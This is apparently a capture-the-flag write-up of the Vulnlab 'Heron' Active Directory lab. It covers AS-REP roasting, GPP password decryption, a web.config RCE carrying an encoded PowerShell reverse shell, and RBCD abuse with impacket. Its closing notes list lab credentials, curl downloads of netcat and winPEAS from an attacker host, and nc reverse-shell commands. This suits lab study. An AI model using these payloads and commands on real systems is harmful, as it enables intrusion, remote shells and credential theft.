# Vulnlab - Heron

## Jump server

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 10:a0:bd:2a:81:3d:37:5d:23:75:c8:d2:83:bf:2a:23 (ECDSA)
|_  256 bd:32:29:26:4d:41:d7:56:01:37:bc:10:0c:de:45:24 (ED25519)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

The server had only port 22 with the credentials provided on vulnlab wiki as this chained machine is an assumed breach scenario `pentest:Heron123!`

<img src="https://i.imgur.com/gZofAmS.png"/>

Checking for privileges, we can't use sudo as this user isn't in sudoers group

<img src="https://i.imgur.com/XAq5Y6e.png"/>

From the user's directory, two users `svc-web-accounting` and `svc-web-accounting-d` belong to `heron.vl` , having only usernames there's only as-rep roasting we could try if these domain users have pre-authentication not required, this could give us the as-rep hash so we can try cracking to get the plain text password.  

<img src="https://i.imgur.com/BSzMIFD.png"/>

Checking the internal ports, there's only ssh here

<img src="https://i.imgur.com/ucBGER1.png"/>

To proceed with as-rep roasting we need to perform pivoting as we directly cannot reach domain controller, this can be done with either chisel or ligolo-ng, I'll be using chisel since we only need to access one host, if it were a network then ligolog would have been a better option for that

```bash
chisel server --reverse -p 3000
chisel client 10.8.0.136:3000 R:socks
```

<img src="https://i.imgur.com/Mko09nM.png"/>

With Get-NPUsers to check the pre-authentication not required, both of the users had that required

<img src="https://i.imgur.com/ZfyeCbs.png"/>

Bruteforcing the SIDs with guest account was not possible too as that account was disabled

<img src="https://i.imgur.com/9bZ82My.png"/>

Visiting the web page, we have a pager about heron corp with three more usernames at the bottom

<img src="https://i.imgur.com/HZsCNou.png"/>

<img src="https://i.imgur.com/z1lv529.png"/>

Trying to check pre-auth again with these users, we'll get samuel.davies's hash and cracking it with hashcat

<img src="https://i.imgur.com/yJQTcib.png"/>

<img src="https://i.imgur.com/Vy250Im.png"/>

Enumerating the shares, samuel had read access on `sysvol` , `home` and write on `transfer$` which seem to be only two interesting shares right now

<img src="https://i.imgur.com/ieSOE6z.png"/>

Then transfer share was empty, home had bunch of user directories including samuel which was also didn't had anything

<img src="https://i.imgur.com/BfxrUZf.png"/>

<img src="https://i.imgur.com/Luo2ito.png"/>

<img src="https://i.imgur.com/uSo0yIO.png"/>

However, from SYSVOL share in one of the policy directory, we can find encrypted password for svc-web-accounting

<img src="https://i.imgur.com/PDBKC3P.png"/>

<img src="https://i.imgur.com/ajCy3tX.png"/>

Decrypting this with GPP-decrypt python script

<img src="https://i.imgur.com/dGxukR0.png"/>

GPP password can also be recovered through nxc/cme with `gpp_password` module

```bash
proxychains  nxc smb 10.10.196.37 -u 'samuel.davies' -p 'pass' -M gpp_password
```

<img src="https://i.imgur.com/8tWxHyt.png"/>

Checking the access on smb shares with svc-web-accounting-d, there's write access on accounting share

<img src="https://i.imgur.com/jdFb9mk.png"/>
The accounting share has the application files including the `web.config `

<img src="https://i.imgur.com/j3gUK7E.png"/>

Since we have write access to web.config we can edit that and  execute system commands through `AspNetCoreModule` but this method is destructive as it replaces the config file and can cause application to not function as in this scenario the application is working through the use of AccountingApp.dll in the config file 

<img src="https://i.imgur.com/dTVXLD7.png"/>

But before we attempt this we need to first figure out where config is being hosted as from the previous website we found it wasn't there, from the share name this hints us to use `accounting` as vhost

<img src="https://i.imgur.com/bByZgdr.png"/>

This site will ask for credentials where svc-web-accounting-d's creds will work

<img src="https://i.imgur.com/oroItJF.png"/>

The data here was being reflected from the dll which can be analyzed by either ILSpy or DNSpy

<img src="https://i.imgur.com/OkfJX09.png"/>

<img src="https://i.imgur.com/aWJhGak.png"/>

Following this article https://soroush.me/blog/tag/rce/, to replace the path with any which does not exist, changing the processpath to be powershell and in the arguments placing base64 encoded reverse shell to receive on  jump server

<img src="https://i.imgur.com/kacFSP8.png"/>

<img src="https://i.imgur.com/vyCERnC.png"/>


```
<?xml version="1.0" encoding="utf-8"?>  
<configuration>  
  <location path="." inheritInChildApplications="false">  
    <system.webServer>  
      <handlers>  
        <add name="aspNetCore" path="execute.now" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />  
      </handlers>  
      <aspNetCore processPath="powershell" arguments="-e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AOAAuADAALgAxADMANgAiACwAMgAyADIAMgApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" hostingModel="OutOfProcess" />  
    </system.webServer>  
  </location>  
</configuration>  
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```

Now deleting the web.config and replacing it with our modified one then making a request to the webpage with `/execute.now`


<img src="https://i.imgur.com/e4jyVYY.png"/>

<img src="https://i.imgur.com/IYDQCas.png"/>
<img src="https://i.imgur.com/m9qh793.png"/>

After getting a shell, running bloodhound to enumerate the domain

```
proxychains bloodhound-python -d 'heron.vl' -u 'svc-web-accounting-d' -p 'password'  -c all -ns 10.10.237.21
```

<img src="https://i.imgur.com/F7raG3r.png"/>

But from bloodhound, it didn't showed any path leading to privilege escalation/lateral movement

<img src="https://i.imgur.com/yUElxoT.png"/>

Enumerating C:\Windows, we'll find `scripts` folder which is unusal to be there, ssh. ps1 file 
having creentials to` _local ` user 

<img src="https://i.imgur.com/GiXw3j2.png"/>

Switching to user and escalating privileges to root user

<img src="https://i.imgur.com/Rsjmyvy.png"/>

From here we can only do much about reading the NThash of frajmp from /etc/krb5.keytab 

<img src="https://i.imgur.com/DFlX3c7.png"/>

Since we have password of ` _local`, we can try password spraying on domain users which will work on `Julian.Pratt`

<img src="https://i.imgur.com/OY5Jk22.png"/>

We can't login directly on domain controller since it requires non admins to be in remote desktop group, home directory can be access through `home$` share

<img src="https://i.imgur.com/LBQs4SY.png"/>

From here we can grab the shortcut files for putty sessions from where we'll get the password of `adm_prju`

<img src="https://i.imgur.com/bb5nLeh.png"/>

Checking for paths for gaining domain, this user is in `Admins_T1` group which has `WriteAccountRestrictions` acl on domain controller, which essentially is similar to GenericWrite or WriteProperty that can allow to edit `msDS-AllowedToActOnBehalfOfOtherIdentity` adding a machine account for which we have password for abusing resource based delegaiton (RBCD)

<img src="https://i.imgur.com/Yb1qjnq.png"/>

We can do this attack in two ways, since we have the NThash of frajmp, we can append that account in dc's property or we can utilize a user account without having any SPN by replacing the password with it's TGT session and combining S4U2Self and U2U protocols to abuse but this method is quite destructive and must be avoided only if there's a test account

Going with the machine account approach, by first editing the property

```bash
 proxychains impacket-rbcd -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -dc-ip '10.10.153.149' -action 'write' 'heron.vl'/'adm_prju':'passowrd'
```

<img src="https://i.imgur.com/5JTpH30.png"/>

```bash
proxychains impacket-getST -spn 'cifs/MUCDC' -impersonate _admin -dc-ip '10.10.153.149' 'heron.vl/frajmp$' -hashes ':hash'
```

<img src="https://i.imgur.com/pwST8pB.png"/>

<img src="https://i.imgur.com/3evqV6D.png"/>



# References

- https://www.hackingarticles.in/credential-dumping-group-policy-preferences-gpp/
- https://github.com/t0thkr1s/gpp-decrypt
- https://soroush.me/blog/tag/rce/
- https://www.thehacker.recipes/ad/movement/kerberos/delegations/rbcd
- https://github.com/sosdave/KeyTabExtract

```
pentest:Heron123!
samuel.davies:l6fkiy9oN
svc-web-accounting-d:H3r0n2024#!
_local:Deplete5DenialDealt
Julian.Pratt:Deplete5DenialDealt
curl 10.8.0.136:8080/nc64.exe -o nc.exe
curl 10.8.0.136/winPEASx64.exe -o win.exe
.\nc.exe 10.8.0.136 3333 -e cmd.exe

curl 10.8.0.136/RunasCs.exe -o RunasCs.exe
.\RunasCs.exe  Julian.Pratt 'Deplete5DenialDealt' -d heron.vl 'C:\webaccounting\nc.exe 10.8.0.136 3333 -e cmd.exe' -l 9

FRAJMP$:6f55b3b443ef192c804b2ae98e8254f7

Set-ADComputer MUCJMP -PrincipalsAllowedToDelegateToAccount FRAJMP$
Get-ADComputer MUCJMP -Properties PrincipalsAllowedToDelegateToAccount

adm_prju@mucjmp:ayDMWV929N9wAiB4&

evil-winrm -i 10.10.217.85 -u _admin -H 3998cdd28f164fa95983caf1ec603938


```
